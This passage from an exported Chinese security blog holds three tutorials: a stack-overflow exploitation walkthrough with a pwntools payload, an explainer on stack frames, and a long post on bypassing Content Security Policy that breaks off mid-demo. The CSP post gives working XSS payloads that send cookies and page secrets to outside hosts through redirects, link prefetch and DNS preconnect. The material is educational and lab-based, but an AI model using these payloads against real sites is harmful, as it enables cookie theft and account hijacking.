为了验证一下本次IDA计算出的偏移值是否准确，我们接着在gets()函数的下一条指令地址处即0x08048466中打下断点，再c继续往下运行，要求输入字符串，这里输入“hello”之后程序就停止在断点处： 可以看到，存放“hello”的内存地址即s的地址为0xffffd014，且ESP下一次会指向该地址。该地址和使用IDA给出的偏移量计算出来的结果一致，即这次的IDA计算结果可信。 由此可知，s的地址为0xffffd014，则s距离EBP偏移量为14h，则s与函数返回地址的偏移为14h+4=18h。 （2）使用GDB pattern字符串溢出计算偏移量GDB的pattern_create创建计算溢出偏移量的字符串，在输入内容时输入即可： 记下此刻的EIP值，即0x44414128或字符“(AAD”，再输入pattern_offset中计算出偏移值： 得出s与函数返回地址的偏移为24，即18h=14h+4。 6、编写payload在下面payload中，前面14h个字节码用“a”覆盖，将EBP覆盖为“bbbb”，最后插入小端存储形式的pwn()函数地址： 12345678from pwn import *sh = process("./stack_test")pwn_addr = 0x0804843Bpayload = flat(["a" * 0x14, "bbbb", p32(pwn_addr)])# payload = flat(["a" * 0x14, p32(1), p32(pwn_addr)])sh.sendline(payload)print sh.recvall() 运行payload，直接栈溢出执行了pwn()函数： 整个栈溢出的漏洞发现及利用过程大致如此，当然还有其他的一些技巧这里还未涉及。 0x03 栈溢出步骤小结Demo是具体细化的步骤，总体而言主要分为两个步骤，先是找到危险函数确定存在栈溢出漏洞，然后就是通过调试分析计算出栈溢出攻击利用需要溢出的偏移量，最后就可以顺利地写exp进行利用。 寻找危险函数通过寻找危险函数，我们快速确定程序是否可能有栈溢出，以及有的话，栈溢出的位置在哪里。常见的危险函数如下 输入 gets，直接读取一行，忽略’\x00’ scanf vscanf 输出 sprintf 字符串 strcpy，字符串复制，遇到’\x00’停止 strcat，字符串拼接，遇到’\x00’停止 bcopy 确定填充长度这一部分主要是计算我们所要操作的地址与我们所要覆盖的地址的距离。常见的操作方法就是打开 IDA，根据其给定的地址计算偏移。一般变量会有以下几种索引模式： 相对于栈基地址的的索引，可以直接通过查看 EBP 相对偏移获得 相对应栈顶指针的索引，一般需要进行调试，之后还是会转换到第一种类型。 直接地址索引，就相当于直接给定了地址。 一般来说，我们会有如下的覆盖需求： 覆盖函数返回地址，这时候就是直接看 EBP 即可。 覆盖栈上某个变量的内容，这时候就需要更加精细的计算了。 覆盖 bss 段某个变量的内容。 根据现实执行情况，覆盖特定的变量或地址的内容。 之所以我们想要覆盖某个地址，是因为我们想通过覆盖地址的方法来直接或者间接地控制程序执行流程。 0x04 参考栈溢出原理 手把手教你栈溢出从入门到放弃（上）]]></content>
      <categories>
        <category>Pwn</category>
      </categories>
      <tags>
        <tag>二进制</tag>
        <tag>栈溢出</tag>
        <tag>Pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[栈基础]]></title>
    <url>%2F2019%2F03%2F03%2F%E6%A0%88%E5%8F%8A%E6%A0%88%E5%B8%A7%2F</url>
    <content type="text"><![CDATA[栈栈是一种典型的后进先出 (Last in First Out) 的数据结构，其操作主要有压栈 (push) 与出栈 (pop) 两种操作，两者都是对栈顶的操作。 每个程序在运行时都有虚拟地址空间，其中某一部分就是该程序对应的栈，用于保存函数调用信息和局部变量。 程序的栈是从进程地址空间的高地址向低地址增长的，即从栈顶处增长。 栈帧栈帧（Stack Frame）是利用EBP寄存器访问栈内局部变量、参数、函数返回地址等的手段，在程序中用于声明局部变量、调用函数等。 整个过程为：调用某函数时，先把用作基准点（函数起始地址）的ESP值保存到EBP并维持在函数内部。无论ESP的值如何变化，以EBP的值为基准能够准确安全访问到相关函数的局部变量、参数、返回地址等。 基本的栈帧结构如下： 123456PUSH EBPMOV EBP,ESP...MOV ESP,EBPPOP EBPRETN 具体的可参考之前的博文：栈帧 函数调用栈 函数调用栈是指程序运行时内存一段连续的区域，用来保存函数运行时的状态信息，包括函数参数与局部变量等。称之为“栈”是因为发生函数调用时，调用函数（caller）的状态被保存在栈内，被调用函数（callee）的状态被压入调用栈的栈顶；在函数调用结束时，栈顶的函数（callee）状态被弹出，栈顶恢复到调用函数（caller）的状态。函数调用栈在内存中从高地址向低地址生长，所以栈顶对应的内存地址在压栈时变小，退栈时变大。 函数调用发生和结束时调用栈的变化如图： 函数状态主要涉及三个寄存器——ESP，EBP，EIP。ESP用来在Push和Pop时存储函数调用栈的栈顶地址。EBP用来存储当前函数状态的基地址，在函数运行时不变，可以用来索引确定函数参数或局部变量的位置，即栈帧作用。EIP用来存储即将执行的程序指令的地址，CPU依照 EIP的存储内容读取指令并执行，EIP随之指向相邻的下一条指令，如此反复，程序就得以连续执行指令。 函数调用开始时的栈变化下面让我们来看看发生函数调用开始时，栈顶函数状态以及上述寄存器的变化。 变化的核心任务是将调用函数（caller）的状态保存起来，同时创建被调用函数（callee）的状态。 1、逆序Push被调函数的参数入栈首先将被调用函数（callee）的参数按照逆序依次压入栈内。如果被调用函数（callee）不需要参数，则没有这一步骤。这些参数仍会保存在调用函数（caller）的函数状态内，之后压入栈内的数据都会作为被调用函数（callee）的函数状态来保存，如下图（注意一点就是，和开始的图的地址高低位方向不一样，现在是上面是高位下面是低位）： 2、Push调用函数的下一条指令的地址入栈然后将调用函数（caller）进行调用之后的下一条指令地址作为返回地址压入栈内。这样调用函数（caller）的 eip（指令）信息得以保存： 3、Push EBP构建栈帧再将当前的EBP寄存器的值（也就是调用函数的基地址）压入栈内，并将 EBP寄存器的值更新为当前栈顶的地址。这样调用函数（caller）的 EBP（基地址）信息得以保存。同时，EBP被更新为被调用函数（callee）的基地址： 4、Push被调函数的局部变量等数据入栈再之后是将被调用函数（callee）的局部变量等数据压入栈内： 在压栈的过程中，esp 寄存器的值不断减小（对应于栈从内存高地址向低地址生长）。压入栈内的数据包括调用参数、返回地址、调用函数的基地址，以及局部变量，其中调用参数以外的数据共同构成了被调用函数（callee）的状态。在发生调用时，程序还会将被调用函数（callee）的指令地址存到 eip 寄存器内，这样程序就可以依次执行被调用函数的指令了。 函数调用结束时的栈变化看过了函数调用发生时的情况，就不难理解函数调用结束时的变化。 变化的核心任务是丢弃被调用函数（callee）的状态，并将栈顶恢复为调用函数（caller）的状态。 1、Pop被调函数局部变量等数据出栈首先被调用函数的局部变量会从栈内直接弹出，栈顶会指向被调用函数（callee）的基地址。 2、通过栈帧恢复调用函数基地址然后将基地址内存储的调用函数（caller）的基地址从栈内弹出，并存到 EBP寄存器内。这样调用函数（caller）的 EBP（基地址）信息得以恢复。此时栈顶会指向返回地址。 3、Pop调用函数下一条指令的地址到栈顶再将返回地址从栈内弹出，并存到 EIP寄存器内。这样调用函数（caller）的 EIP（指令）信息得以恢复。 至此调用函数（caller）的函数状态就全部恢复了，之后就是继续执行调用函数的指令了，中间的被调函数的参数会直接被略过而返回到调用函数的指令中继续执行。 函数调用约定可参考之前的博文：函数调用约定 另外推荐两个学习函数调用栈的详细的教程： C 语言函数调用栈 (一) C 语言函数调用栈 (二) 参考栈介绍 手把手教你栈溢出从入门到放弃（上）]]></content>
      <categories>
        <category>二进制基础</category>
      </categories>
      <tags>
        <tag>二进制</tag>
        <tag>栈溢出</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CSP策略及绕过技巧小结]]></title>
    <url>%2F2019%2F02%2F24%2FCSP%E7%AD%96%E7%95%A5%E5%8F%8A%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7%E5%B0%8F%E7%BB%93%2F</url>
    <content type="text"><![CDATA[0x01 何为CSPCSP（Content Security Policy）即内容安全策略，为了缓解很大一部分潜在的跨站脚本问题，浏览器的扩展程序系统引入了内容安全策略（CSP）的一般概念。这将引入一些相当严格的策略，会使扩展程序在默认情况下更加安全，开发者可以创建并强制应用一些规则，管理网站允许加载的内容。 CSP的实质就是白名单机制，对网站加载或执行的资源进行安全策略的控制。 0x02 CSP语法CSP中常见的header字段为Content-Security-Policy。 一个CSP头由多组CSP策略组成，中间由分号分隔，如下： 1Content-Security-Policy: default-src &apos;self&apos; www.baidu.com; script-src &apos;unsafe-inline&apos; 其中每一组策略包含一个策略指令和一个内容源列表。 策略指令default-srcdefault-src作为所有其他指令的备用，一般来说default-src ‘none’; script-src ‘self’这样的情况就会是script-src遵循self，其他的都会使用none。也就是说，除了被设置的指令以外，其余指令都会被设置为default-src指令所设置的属性。 script-srcscript-src指令限制了所有js脚本可以被执行的地方，包括通过链接方式加载的脚本url以及所有内联脚本，甚至包括各种方式的引用。其中还有一个很重要的参数叫’unsafe-inline’，如果加上这个参数，就不会阻止内联脚本，但这被认为是不安全的。 对于这个属性有个特殊的配置叫unsafe-eval，它会允许下面几个函数： 1`eval()Function()setTimeout() with an initial argument which is not callable.setInterval() with an initial argument which is not callable.` style-srcstyle-src定义了页面中CSS样式的有效来源，包括下面三种引用的css属性，style也有个‘unsafe-inline’这个参数，同理会允许所有的内联css。 1、第一种是通过link标签加载的css，类似于&lt;link href=&quot;001.css&quot; type=&quot;text/css&quot; rel=&quot;Stylesheet&quot;/&gt; 2、当然还有style标签 123&lt;style type="text/css"&gt;.main&#123; width:1002px; margin:0 auto;&#125;&lt;/style&gt; 3、还有通过@import引入的样式表 1234&lt; STYLE TYPE="text/css"&gt; @import "example.css"; @import "style/other.css"; &lt; /STYLE&gt; 4、内联样式表，类似于style=&quot;font-size:10px;font-color:#ff0000&quot; img-srcimg-src定义了页面中图片和图标的有效来源。 font-srcfont-src定义了字体加载的有效来源。 connect-srcconnect-src定义了请求、XMLHttpRequest、WebSocket 和 EventSource 的连接来源。如下例子： 1`&lt;a ping="https://not-example.com"&gt;...&lt;script&gt; var xhr = new XMLHttpRequest(); xhr.open('GET', 'https://not-example.com/'); xhr.send(); var ws = new WebSocket("https://not-example.com/"); var es = new EventSource("https://not-example.com/"); navigator.sendBeacon("https://not-example.com/", &#123; ... &#125;);&lt;/script&gt;` child-srcchild-src 指定定义了 web workers 以及嵌套的浏览上下文（如frame和iframe）的源。 会匹配iframe和frame标签，如下： 1234567首先设置cspContent-Security-Policy: child-src https://example.com/而下面的请求会被CSP拦截&lt;iframe src="https://not-example.com"&gt;&lt;/iframe&gt;&lt;script&gt; var blockedWorker = new Worker("data:application/javascript,...");&lt;/script&gt; manifest-srcmanifest-src指令限制了从应用清单可以加载的url。 这个属性不太熟，比较常见的就是link： 1234举个例子：Content-Security-Policy: manifest-src https://example.com/下面的请求会返回错误:&lt;link rel="manifest" href="https://not-example.com/manifest"&gt; 内容源内容源有三种：源列表、关键字和数据。 源列表源列表是一个字符串，指定了一个或多个互联网主机（通过主机名或 IP 地址），和可选的或端口号。站点地址可以包含可选的通配符前缀 (星号, ‘*‘)，端口号也可以使用通配符 (同样是 ‘*‘) 来表明所有合法端口都是有效来源。主机通过空格分隔。 有效的主机表达式包括： http://*.foo.com （匹配所有使用 http协议加载 foo.com 任何子域名的尝试。） mail.foo.com:443 （匹配所有访问 mail.foo.com 的 443 端口 的尝试。） https://store.foo.com （匹配所有使用 https协议访问 store.foo.com 的尝试。） 如果端口号没有被指定，浏览器会使用指定协议的默认端口号。如果协议没有被指定，浏览器会使用访问该文档时的协议。 关键字 ‘none’代表空集；即不匹配任何 URL。两侧单引号是必须的。 ‘self’代表和文档同源，包括相同的 URL 协议和端口号。两侧单引号是必须的。 ‘unsafe-inline’允许使用内联资源，如内联的script元素、javascript: URL、内联的事件处理函数和内联的style元素，两侧单引号是必须的。 ‘unsafe-eval’允许使用 eval() 等通过字符串创建代码的方法。两侧单引号是必须的。 数据 data: 允许data: URI作为内容来源。 mediastream: 允许mediastream: URI作为内容来源。 1Content-Security-Policy: default-src &apos;self&apos;; img-src &apos;self&apos; data:; media-src mediastream: 0x03 CSP绕过绕过场景其实是很多的，这里慢慢来收集吧，主要是先收集一些广泛公开的和CTF中遇到的吧。 1、绕过default-src ‘none’策略为：Content-Security-Policy: default-src ‘none’; 这种情况下，可以使用meta标签实现跳转： 1&lt;meta http-equiv="refresh" content="1;url=https://www.mi1k7ea.com/x.php?c=[cookie]" &gt; Demo如下： 12345678910111213141516171819202122&lt;?php $nonce = md5(openssl_random_pseudo_bytes(16)); header(&quot;Content-Security-Policy: default-src &apos;none&apos;; &quot;);?&gt;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;CSP Test&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h2&gt;CSP Test&lt;/h2&gt;&lt;form action=&quot;test.php&quot; method=&quot;post&quot;&gt; &lt;input type=&quot;text&quot; name=&quot;content&quot;&gt; &lt;button type=&quot;submit&quot;&gt;Go&lt;/button&gt;&lt;/form&gt;&lt;?php if (isset($_POST[&apos;content&apos;])) &#123; echo &quot;Your POST content: &lt;p&gt;&quot;.@$_POST[&apos;content&apos;].&quot;&lt;/p&gt;&quot;; &#125;?&gt;&lt;/body&gt;&lt;/html&gt; 当我们输入如下内容可以成功跳转至目标页面，当然也可以将cookie带出来： 1&lt;meta http-equiv="refresh" content="1;url=http://192.168.43.201:8000/x.php?c=mi1k7ea" &gt; 2、形同虚设的script-src ‘unsafe-inline’策略中有一条为：script-src ‘unsafe-inline’; ，这条策略相当于直接让CSP几乎沦陷了大半。 在允许unsafe-inline的情况下，可以用window.location，或者window.open之类的方法进行跳转绕过。 123&lt;script&gt;window.location="https://www.mi1k7ea.com/x.php?c=[cookie]";&lt;/script&gt;&lt;script&gt;window.open('//www.mi1k7ea.com/?'+escape(document.cookie))&lt;/script&gt;&lt;script&gt;window.location.href='https://www.mi1k7ea.com/?cookie='+document.cookie&lt;/script&gt; Demo代码还是之前的，把CSP修改一下，添加script-src ‘unsafe-inline’;即可。 输入如下标签直接跳转并成功返回cookie： 1&lt;script&gt;window.location.href='http://192.168.43.201:8000/?cookie='+document.cookie&lt;/script&gt; 内嵌script都可以执行，当然可以直接执行本页面的JS，如输入&lt;script&gt;alert(document.cookie)&lt;/script&gt;即可，这里的利用和XSS利用一致，没有啥绕过技巧，不再累赘。 3、绕过xx-src **号即允许匹配任何URL请求。但一般情况很少会遇到default-src ;或大部分xx-src ;这样的CSP策略，举一个简单的例子： 1Content-Security-Policy: default-src &apos;none&apos;; connect-src &apos;self&apos;; frame-src *; script-src http://xxxxx/js/ &apos;nonce-xxx&apos;;font-src http://xxxx/fonts/ fonts.gstatic.com; style-src &apos;self&apos; &apos;unsafe-inline&apos;; img-src &apos;self&apos; 很明显地可以找到，frame-src *，其对于iframe的来源并没有做任何限制，当然实际环境可能需要iframe标签来内联来包含别的页面。 可以利用CSRF漏洞。这里直接输入&lt;iframe src=&quot;https://www.mi1k7ea.com&quot;&gt;&lt;/iframe&gt;来测试： 当然，iframe也可以内嵌外部弹框的JS： 查看页面元素，可以看到iframe内嵌包含进来的是&lt;script&gt;alert(1)&lt;/script&gt;，其可以正常执行而无视掉script-src http://xxxxx/js/ &#39;nonce-xxx&#39;;的CSP策略。 4、利用link绕过xx-src selfCSP策略中xx-src self的设置能够使大部分的XSS和CSRF都会失效，但link标签的预加载功能可以进行绕过。 在Chrome下，可以使用如下标签发送cookie（最新版Chrome会禁止）： 1&lt;link rel="prefetch" href="https://www.mi1k7ea.com/c.php?c=[cookie]"&gt; 在Firefox下，可以将cookie作为子域名，用DNS预解析的方式把cookie带出去，查看DNS服务器的日志就能得到cookie： 1&lt;link rel="dns-prefetch" href="//[cookie].mi1k7ea.com"&gt; 在后面的iframe中会有结合利用的示例。 5、利用浏览器补全绕过script nonce有时候CSP策略可能会设置成如下： 1Content-Security-Policy: default-src &apos;none&apos;;script-src &apos;nonce-xxx&apos; 这种情况下，script标签需要带上正确的nonce属性值才能执行JS代码。 如果，出现了脚本插入点在含有nonce属性值的script标签前面的情况时，如： 12&lt;p&gt;插入点&lt;/p&gt;&lt;script id="aa" nonce="abc"&gt;document.write('CSP');&lt;/script&gt; 可以插入如下内容来利用浏览器补全功能： 1&lt;script src="http://192.168.248.1/a.js" a=" 最终形成如下页面结构： 12&lt;p&gt;&lt;script src="http://192.168.248.1/a.js" a="&lt;/p&gt;&lt;script id="aa" nonce="xxx"&gt;document.write('CSP');&lt;/script&gt; 也就是说，利用浏览器补全的功能，在含有nonce的script标签前面的插入点插入script标签的同时，插入a=”以闭合后面script标签的第一个属性的双引号，从而使中间的内容失效，将本来的nonce属性劫持到了插入的script标签中，使得该插入标签可以正常执行JS代码，也就是说浏览器会给我们自动补全只有一个双引号的属性的值。 还有一个注意点，上述的a标签在Chrome上是执行不了的，原因在于Chrome对于标签的解析方式则不同，Chrome中解析script标签的优先级高于解析属性双引号内的值，因而前面双引号闭合的时候没法正常使其失效。但是这里可以使用src属性替代，使其可在Chrome下正常执行。 Demo 1234567891011121314151617181920212223&lt;?php $nonce = md5(openssl_random_pseudo_bytes(16)); header(&quot;Content-Security-Policy: default-src &apos;none&apos;; script-src &apos;nonce-$nonce&apos;; &quot;);?&gt;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;CSP Test&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h2&gt;CSP Test&lt;/h2&gt;&lt;form action=&quot;test.php&quot; method=&quot;post&quot;&gt; &lt;input type=&quot;text&quot; name=&quot;content&quot;&gt; &lt;button type=&quot;submit&quot;&gt;Go&lt;/button&gt;&lt;/form&gt;&lt;?php if (isset($_POST[&apos;content&apos;])) &#123; echo &quot;Your POST content: &lt;p&gt;&quot;.@$_POST[&apos;content&apos;].&quot;&lt;/p&gt;&quot;; &#125;?&gt;&lt;script type=&quot;text/javascript&quot; nonce=&lt;?php echo $nonce;?&gt;&gt;document.write(&quot;Mi1k7ea&quot;)&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 当我们输入&lt;script src=&quot;http://192.168.43.201/a.js&quot; a=&quot;时即会弹框： 查看元素，看到输入的script标签的a属性的双引号将后面含有nonce的script标签第一个含有双引号的属性都给闭合了，成功劫持了nonce属性进而加载外部JS弹框： 值得注意的就是，要想成功利用在nonce属性前需要存在一个用引号括起来的属性，不然会失效。 另外，在之前做过的一道CSP题目中，也有应用到这种方法，可以参考学习一下：一道绕过CSP的XSS题目 6、利用Gadgets和strict-dynamic/unsafe-eval绕过即重用Gadgets代码来绕过CSP，具体可参考Black Hat 2017的ppt，上面总结了可以被用来绕过CSP的一些JS库。 例如假设页面中使用了Jquery-mobile库，并且CSP策略中包含”script-src ‘unsafe-eval’”或者”script-src ‘strict-dynamic’”，那么下面的向量就可以绕过CSP： 1&lt;div data-role=popup id='&lt;script&gt;alert(1)&lt;/script&gt;'&gt;&lt;/div&gt; 在这个PPT之外的还有一些库也可以被利用，例如RCTF2018中遇到的amp库，下面的标签可以获取名字为FLAG的cookie： 1&lt;amp-pixel src="http://your domain/?cid=CLIENT_ID(FLAG)"&gt;&lt;/amp-pixel&gt; 在做过的一道CSP题目中，也有应用到这种方法，可以参考学习一下：一道绕过CSP的XSS题目 7、利用iframe绕过（1）如果页面A中有CSP限制，但是页面B中没有，同时A和B同源，那么就可以在A页面中包含B页面来绕过CSP：1&lt;iframe src="B"&gt;&lt;/iframe&gt; 下面简单地搞个示例。 1.php代码，有CSP限制，但可以通过iframe加载同源的页面： 12345678910111213141516171819202122&lt;?php $nonce = md5(openssl_random_pseudo_bytes(16)); header(&quot;Content-Security-Policy: default-src &apos;none&apos;; script-src &apos;nonce-$nonce&apos;; frame-src &apos;self&apos;; &quot;);?&gt;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;CSP Test&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h2&gt;CSP Test&lt;/h2&gt;&lt;form action=&quot;1.php&quot; method=&quot;post&quot;&gt; &lt;input type=&quot;text&quot; name=&quot;content&quot;&gt; &lt;button type=&quot;submit&quot;&gt;Go&lt;/button&gt;&lt;/form&gt;&lt;?php if (isset($_POST[&apos;content&apos;])) &#123; echo &quot;Your POST content: &lt;p&gt;&quot;.@$_POST[&apos;content&apos;].&quot;&lt;/p&gt;&quot;; &#125;?&gt;&lt;/body&gt;&lt;/html&gt; 2.php简单写为&lt;script&gt;alert(&#39;Mi1k7ea&#39;)&lt;/script&gt;。 在访问1.php时，直接输入script标签是无法执行弹框的，但可以通过iframe引入同源的2.php来执行该页面的JS代码，输入&lt;iframe src=&#39;http://127.0.0.1/2.php&#39;&gt;&lt;/iframe&gt;： （2）在Chrome下，iframe标签支持csp属性，这有时候可以用来绕过一些防御，例如”http://xxx“页面有个js库会过滤XSS向量，我们就可以使用csp属性来禁掉这个js库：1&lt;iframe csp="script-src 'unsafe-inline'" src="http://xxx"&gt;&lt;/iframe&gt; （3）绕过sandbox：情景1——未开启X-Frame-Options:DENY Demo代码如下： 123456789101112&lt;?php header(&quot;Content-Security-Policy: default-src &apos;self&apos; &apos;unsafe-inline&apos;; sandbox allow-forms allow-same-origin allow-scripts allow-modals allow-popups&quot;); setcookie(&apos;milk&apos;,&apos;tea&apos;);?&gt;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;CSP Test&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;script&gt;&lt;?php echo $_GET[&apos;xss&apos;];?&gt;&lt;/script&gt;&lt;/body&gt; 当CSP设置为allow-popups开启时，window.open等就可以打开新的窗口，这时直接就能利用了，直接输入如下内容就能顺利地带出cookie信息（在URL栏输入前记得先进行URL编码）： 123?xss=window.open(&apos;//xxx.ceye.io/?&apos;+escape(document.cookie))或?xss=window.location.href=&apos;http://xxx.ceye.io/?cookie=&apos;+document.cookie 这里加载同源的js文件是没有问题的，其中a.js的代码为alert(1)，构造如下：： 1xss=f=document.createElement(&quot;script&quot;);f.src=&quot;http://127.0.0.1/a.js&quot;;document.body.appendChild(f); 但是有个问题，要是远程加载JS文件是不满足CSP规则的。这里我们换个源就知道了： 1xss=f=document.createElement(&quot;script&quot;);f.src=&quot;http://127.0.0.1:8000/a.js&quot;;document.body.appendChild(f); 显示拒绝加载了，因为CSP中有一条default-src ‘self’的规则限制了。 这里可以通过iframe引入外部js，将src设置为同域的，从而绕过CSP的default-src ‘self’规则。 123456789f=document.createElement("iframe");f.id="pwn";f.src="./test.txt";f.onload=()=&gt;&#123; x=document.createElement('script'); x.src='//127.0.0.1:8000/a.js'; pwn.contentWindow.document.body.appendChild(x)&#125;;document.body.appendChild(f); 没有问题，成功引入外部js弹框： 当然也能把浏览器的数据带出来，引用外部新的c.js： 1window.open(&apos;//xxx.ceye.io/?&apos;+escape(document.cookie)) 输入： 1xss=f=document.createElement(%22iframe%22);f.id=%22pwn%22;f.src=%22./test.txt%22;f.onload=()=%3E&#123;x=document.createElement(%27script%27);x.src=%27//192.168.17.148:81/c.js%27;pwn.contentWindow.document.body.appendChild(x)&#125;;document.body.appendChild(f); 这里没有出现网上博客说的带不回的问题。 下面也可以尝试使用DNS通道来传递cookie。 123456789dc = document.cookie;dcl = dc.split(";");m = document.getElementsByTagName("HEAD")[0];for (var i=0; i&lt;dcl.length;i++)&#123;console.log(dcl[i]);m.innerHTML = m.innerHTML + "&lt;link rel=\"preconnect\" href=\"//" + escape(dcl[i].replace(/\//g, "-")).replace(/%/g, "_") + '.' + location.hostname.split(".").join("") + ".xxx.ceye.io\"&gt;";console.log(m.innerHTML);&#125; 在URL栏输入的时候记得进行URL编码，然后就可以看到打到cookie了： 除此之外，我们还可以获取页面中父窗口标签的内容，在php代码中加上id为secret的标签内容，注意标签必须放在获取URL参数的script标签之上，否则会报错找不到： 12345678910111213&lt;?php header(&quot;Content-Security-Policy: default-src &apos;self&apos; &apos;unsafe-inline&apos;; sandbox allow-forms allow-same-origin allow-scripts allow-modals allow-popups; &quot;); setcookie(&apos;milk&apos;,&apos;tea&apos;);?&gt;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;CSP Test&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;code id=&apos;secret&apos;&gt;P4ssw0rd&lt;/code&gt; &lt;script&gt;&lt;?php echo $_GET[&apos;xss&apos;];?&gt;&lt;/script&gt;&lt;/body&gt; 改下第一行的内容获取id为secret的父窗口标签即可： 123456789dc = top.document.getElementById("secret").innerHTML;dcl = dc.split(";");m = document.getElementsByTagName("HEAD")[0];for (var i=0; i&lt;dcl.length;i++)&#123;console.log(dcl[i]);m.innerHTML = m.innerHTML + "&lt;link rel=\"preconnect\" href=\"//" + escape(dcl[i].replace(/\//g, "-")).replace(/%/g, "_") + '.' + location.hostname.split(".").join("") + ".xxx.ceye.io\"&gt;";console.log(m.innerHTML);&#125; 直接打到父窗口标签内容： 情景2——开启X-Frame-Options:DENY 如果header中添加了X-Frame-Options:DENY，则不能如此直接地利用前面的exp。 这里换个示例：http://hsts.pro/csp.php 访问，默认弹框显示welcome，可以看到站点是开了X-Frame-Options:DENY的： 查看页面源码，可以看到和之前的是差不多的，在xss参数中获取URL输入然后嵌入script标签中，其中还含有id为secret的标签： 123456789&lt;html&gt;&lt;head&gt;&lt;link rel="stylesheet" href="/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u"&gt;&lt;link rel="stylesheet" href="/css/bootstrap-theme.min.css" integrity="sha384-rHyoN1iRsVXV4nD0JutlnGaslCJuC7uwjduW9SVrLvRYooPp2bWYgmgJQIXwl/Sp"&gt;&lt;/head&gt;&lt;body&gt;&lt;div class="center-block"&gt;&lt;h1&gt;Hello!&lt;/h1&gt;&lt;script&gt;alert("Welcome")&lt;/script&gt;&lt;code id='secret'&gt;Secret: iGWmT7P2YlYNytnE&lt;/code&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 这里可使用CSP的第二个常见错误，即在返回Web扫描程序错误时没有提供保护性头部。若要验证这一点，最简单方法是尝试打开并不存在的网页。因为许多资源只为含有200代码的响应提供了X-Frame-Options头部，而没有为包含404代码的响应提供相应的头部。 为了强制NGINX返回“400 bad request”，你唯一需要做的，就是使用/../访问其上一级路径中的资源。为防止浏览器对请求进行规范化处理，导致/../被/所替换，对于中间的两个点号和最后一个斜线，我们可以使用unicode码来表示。 123frame=document.createElement("iframe");frame.src="/%2e%2e%2f";document.body.appendChild(frame); 直接在控制台插入即可，当然也可以通过xss参数输入： 上payload获取父窗口标签内容： 12345678910frame=document.createElement("iframe");frame.src="/%2e%2e%2f";document.body.appendChild(frame);frame.id="pwn";frame.onload=()=&gt;&#123; x=document.createElement('script'); x.src='data:,alert("Pwned "+top.secret.textContent)'; pwn.contentWindow.document.body.appendChild(x)&#125;;document.body.appendChild(frame); 当然，也可以访问不存在的页面，造成404错误，注意会弹两次框： 12345678910frame=document.createElement("iframe");frame.src="/noexist.txt";document.body.appendChild(frame);frame.id="pwn";frame.onload=()=&gt;&#123; x=document.createElement('script'); x.src='data:,alert("Pwned "+top.secret.textContent)'; pwn.contentWindow.document.body.appendChild(x)&#125;;document.body.appendChild(frame); 第二种让Web服务器返回错误的方法是让URL超过所允许的长度。 例如NGINX和Apache等Web服务器的默认URL长度通常被设置为不超过8kB。 123456789frame=document.createElement("iframe");frame.src="/"+"A".repeat(20000);frame.id="pwn";frame.onload=()=&gt;&#123; x=document.createElement('script'); x.src='data:,alert("Pwned "+top.secret.textContent)'; pwn.contentWindow.document.body.appendChild(x)&#125;;document.body.appendChild(frame); 第三种欺骗服务器返回错误的方法是触发cookie长度限制。 这是因为当前浏览器支持的cookie越来越长，已经超出了Web服务器所能处理的范围。 1、创建一个巨型的 cookie 1for(var i=0;i&lt;5;i++)&#123;document.cookie=i+”=”+”a”.repeat(4000)&#125;; 2、使用任何地址打开iframe，都会导致服务器返回错误（通常没有XFO或CSP） 3、删除巨型cookie： 1for(var i=0;i&lt;5;i++)&#123;document.cookie=i+”=”&#125; 4、将自己的js脚本写入frame中，用以窃取其父frame中的秘密信息。 payload： 1234567891011for(var i=0;i&lt;5;i++)&#123;document.cookie=i+"="+"a".repeat(4000)&#125;;f=document.createElement("iframe");f.id="pwn";f.src="/";f.onload=()=&gt;&#123; for(var i=0;i&lt;5;i++)&#123;document.cookie=i+"="&#125;; x=document.createElement('script'); x.src='data:,alert("Pwned "+top.secret.textContent)'; pwn.contentWindow.document.body.appendChild(x)&#125;;document.body.appendChild(f); 8、利用meta绕过CSP noncemeta标签有一些不常用的功能有时候有奇效： meta可以控制缓存（在header没有设置的情况下），有时候可以用来绕过CSP nonce： 1&lt;meta http-equiv="cache-control" content="public"&gt; meta可以设置Cookie（Firefox下），可以结合self-xss利用： 1&lt;meta http-equiv="Set-Cookie" Content="cookievalue=xxx;expires=Wednesday,21-Oct-98 16:14:21 9、利用浏览器缓存绕过script nonce整个原理过程以Demo为例，看图吧： csp-test.php，开启了nonce script规则，并且有XSS点： 1234567891011121314151617&lt;?phpfunction random_string( $length = 8 ) &#123; $chars = &apos;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&apos;; $password = &apos;&apos;; for($i = 0; $i &lt; $length; $i++) &#123; $password .= $chars[ mt_rand(0, strlen($chars) - 1) ]; &#125; return $password; &#125; $random = random_string(12);header(&apos;Content-Security-Policy: default-src \&apos;none\&apos;; script-src \&apos;nonce-&apos;.$random .&apos;\&apos;;&apos;);header(&apos;Cache-Control: max-age=99999999&apos;);setcookie(&apos;milk&apos;,&apos;tea&apos;);?&gt;&lt;script nonce=&apos;&lt;?php echo $random;?&gt;&apos;&gt;document.write(&apos;URL &apos; + unescape(location.href))&lt;/script&gt;&lt;script nonce=&apos;&lt;?php echo $random;?&gt;&apos;&gt;console.log(&apos;another nonced script&apos;)&lt;/script&gt; 然后我们需要利用iframe引入这个页面，并对其发起请求获取页面内容，这里我们通过向其中注入一个&lt;textarea&gt;标签来吃掉后面的script标签，这样就可以获取内容。 attack.php： 